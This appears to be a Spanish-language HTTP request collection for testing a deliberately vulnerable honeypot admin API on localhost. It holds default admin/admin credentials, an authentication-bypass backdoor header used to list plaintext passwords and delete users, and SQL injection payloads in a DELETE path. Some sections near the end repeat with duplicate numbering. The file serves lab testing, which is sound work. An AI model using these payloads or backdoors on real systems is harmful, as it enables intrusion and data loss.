### ==============================================
### ðŸ‘‘ HONEYPOT - ADMIN ENDPOINTS (Con JWT)
### ==============================================

@baseUrl = http://localhost:3000
@apiUrl = http://localhost:3000/api

### =====================================================
### PASO 1: LOGIN PARA OBTENER TOKEN
### =====================================================
### Ejecuta este request primero y copia el token

### 1. Login como Admin
POST {{apiUrl}}/auth/login
Content-Type: application/json

{
  "username": "admin",
  "password": "admin"
}

### Respuesta esperada:
### {
###   "message": "Login successful",
###   "token": "eyJhbGc...",  <-- COPIAR ESTE TOKEN
###   "user": { "id": 1, "username": "admin", "role": "admin" }
### }

### =====================================================
### PASO 2: USAR ENDPOINTS ADMIN CON TOKEN
### =====================================================
### âš ï¸ REEMPLAZA "YOUR_JWT_TOKEN" con el token del login

@token = YOUR_JWT_TOKEN

### 2. Get All Users (con token admin)
GET {{apiUrl}}/admin/users
Authorization: Bearer {{token}}

### 3. Get Database Statistics (con token admin)
GET {{apiUrl}}/admin/stats
Authorization: Bearer {{token}}

### 4. Get Audit Logs (con token admin)
GET {{apiUrl}}/admin/audit-logs?limit=10
Authorization: Bearer {{token}}

### 5. Get mÃ¡s Audit Logs
GET {{apiUrl}}/admin/audit-logs?limit=50
Authorization: Bearer {{token}}

### 6. Delete User (con token admin)
### âš ï¸ CUIDADO: Elimina permanentemente el usuario
DELETE {{apiUrl}}/admin/users/6
Authorization: Bearer {{token}}

### =====================================================
### TESTS DE AUTORIZACIÃ“N (Usuario Normal)
### =====================================================

### 7. Login como usuario normal
POST {{apiUrl}}/auth/login
Content-Type: application/json

{
  "username": "user",
  "password": "user123"
}

### Usar el token de usuario normal:
@userToken = YOUR_USER_TOKEN

### 8. Intentar acceder a admin/users con token de usuario (deberÃ­a fallar 403)
GET {{apiUrl}}/admin/users
Authorization: Bearer {{userToken}}

### 9. Intentar acceder a admin/stats con token de usuario (deberÃ­a fallar 403)
GET {{apiUrl}}/admin/stats
Authorization: Bearer {{userToken}}

### 10. Intentar eliminar usuario con token de usuario (deberÃ­a fallar 403)
DELETE {{apiUrl}}/admin/users/6
Authorization: Bearer {{userToken}}

### =====================================================
### TESTS SIN AUTORIZACIÃ“N
### =====================================================

### 11. Intentar admin/users sin token (deberÃ­a fallar 401)
GET {{apiUrl}}/admin/users

### 12. Intentar admin/stats sin token (deberÃ­a fallar 401)
GET {{apiUrl}}/admin/stats

### 13. Intentar admin/audit-logs sin token (deberÃ­a fallar 401)
GET {{apiUrl}}/admin/audit-logs

### =====================================================
### TESTS CON TOKEN INVÃLIDO
### =====================================================

### 14. Token invÃ¡lido - admin/users
GET {{apiUrl}}/admin/users
Authorization: Bearer invalid.token.here

### 15. Token malformado - admin/stats
GET {{apiUrl}}/admin/stats
Authorization: Bearer malformed_token

### 16. Token expirado (simular)
GET {{apiUrl}}/admin/users
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1MTYyMzkwMjJ9.expired

### =====================================================
### BACKDOOR - ACCESO SIN AUTENTICACIÃ“N
### =====================================================
### âš ï¸ El header X-AccessDev: Testing-Mode bypasea TODA autenticaciÃ³n

### 17. Backdoor - Get All Users (SIN token)
GET {{apiUrl}}/admin/users
X-AccessDev: Testing-Mode

### 18. Backdoor - Get Stats (SIN token)
GET {{apiUrl}}/admin/stats
X-AccessDev: Testing-Mode

### 19. Backdoor - Get Audit Logs (SIN token)
GET {{apiUrl}}/admin/audit-logs?limit=20
X-AccessDev: Testing-Mode

### 20. Backdoor - Delete User (SIN token) âš ï¸ PELIGROSO
DELETE {{apiUrl}}/admin/users/8
X-AccessDev: Testing-Mode

### =====================================================
### COMBINACIÃ“N: Backdoor + Token vÃ¡lido (redundante)
### =====================================================

### 21. Backdoor + Token admin (ambos vÃ¡lidos)
GET {{apiUrl}}/admin/users
Authorization: Bearer {{token}}
X-AccessDev: Testing-Mode

### 22. Backdoor con token invÃ¡lido (backdoor tiene prioridad)
GET {{apiUrl}}/admin/users
Authorization: Bearer invalid_token
X-AccessDev: Testing-Mode

### =====================================================
### ENUMERACIÃ“N DE USUARIOS
### =====================================================

### 23. Listar todos los usuarios
GET {{apiUrl}}/admin/users
X-AccessDev: Testing-Mode

### Respuesta esperada revela:
### - Usernames
### - Emails  
### - Roles (admin/user)
### - Passwords en texto plano!
### - Login attempts
### - Last login timestamps

### 24. Ver estadÃ­sticas de la base de datos
GET {{apiUrl}}/admin/stats
X-AccessDev: Testing-Mode

### Revela:
### - Total de usuarios
### - Total de productos
### - Total de Ã³rdenes
### - Usuarios por rol
### - Productos por categorÃ­a

### =====================================================
### AUDIT LOG - ANÃLISIS DE ACTIVIDAD
### =====================================================

### 25. Ver Ãºltimos 10 eventos
GET {{apiUrl}}/admin/audit-logs?limit=10
X-AccessDev: Testing-Mode

### 26. Ver Ãºltimos 50 eventos
GET {{apiUrl}}/admin/audit-logs?limit=50
X-AccessDev: Testing-Mode

### 27. Ver Ãºltimos 100 eventos (mÃ¡ximo recomendado)
GET {{apiUrl}}/admin/audit-logs?limit=100
X-AccessDev: Testing-Mode

### Tipos de eventos registrados:
### - login_success
### - login_failed
### - backdoor_access â† detecta uso del backdoor
### - user_deleted
### - user_created

### =====================================================
### ELIMINACIÃ“N DE USUARIOS - âš ï¸ OPERACIONES PELIGROSAS
### =====================================================

### 28. Eliminar usuario guest (ID 6)
DELETE {{apiUrl}}/admin/users/6
X-AccessDev: Testing-Mode

### 29. Eliminar usuario test (ID 5)
DELETE {{apiUrl}}/admin/users/5
X-AccessDev: Testing-Mode

### 30. Intentar eliminar admin (ID 1) - NO RECOMENDADO
# DELETE {{apiUrl}}/admin/users/1
# X-AccessDev: Testing-Mode

### 31. Intentar eliminar usuario inexistente
DELETE {{apiUrl}}/admin/users/999
X-AccessDev: Testing-Mode

### =====================================================
### SQL INJECTION EN DELETE USER (si existe)
### =====================================================

### 32. SQLi en DELETE - Intentar eliminar mÃºltiples usuarios
DELETE {{apiUrl}}/admin/users/1' OR '1'='1
X-AccessDev: Testing-Mode

### 33. SQLi en DELETE - Eliminar por rol
DELETE {{apiUrl}}/admin/users/1' OR role='user' --
X-AccessDev: Testing-Mode

### =====================================================
### RESUMEN DE ENDPOINTS ADMIN
### =====================================================
###
### âœ… Endpoints disponibles:
### GET  /api/admin/users          - Lista todos los usuarios
### GET  /api/admin/stats          - EstadÃ­sticas de DB
### GET  /api/admin/audit-logs     - Logs de auditorÃ­a
### DELETE /api/admin/users/:id    - Eliminar usuario
###
### ðŸ” AutenticaciÃ³n:
### - OpciÃ³n 1: Token JWT de admin (obtener via /api/auth/login)
### - OpciÃ³n 2: Header X-AccessDev: Testing-Mode (BACKDOOR)
###
### âš ï¸ Vulnerabilidades:
### - Backdoor bypasea toda autenticaciÃ³n
### - Passwords expuestas en texto plano
### - Sin rate limiting
### - InformaciÃ³n sensible en respuestas
### - Posible SQLi en DELETE endpoint
###
### =====================================================

### 14. Token malformado
GET {{apiUrl}}/admin/users
Authorization: Bearer token_invalido_123

### 15. Token expirado (si tienes uno)
GET {{apiUrl}}/admin/users
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.expired.token

### 16. Token sin Bearer prefix
GET {{apiUrl}}/admin/users
Authorization: {{token}}

### =====================================================
### TESTS DE PROFILE ENDPOINT
### =====================================================

### 17. Ver perfil con token admin
GET {{apiUrl}}/auth/profile
Authorization: Bearer {{token}}

### 18. Ver perfil con token usuario normal
GET {{apiUrl}}/auth/profile
Authorization: Bearer {{userToken}}

### 19. Ver perfil sin token (deberÃ­a fallar)
GET {{apiUrl}}/auth/profile
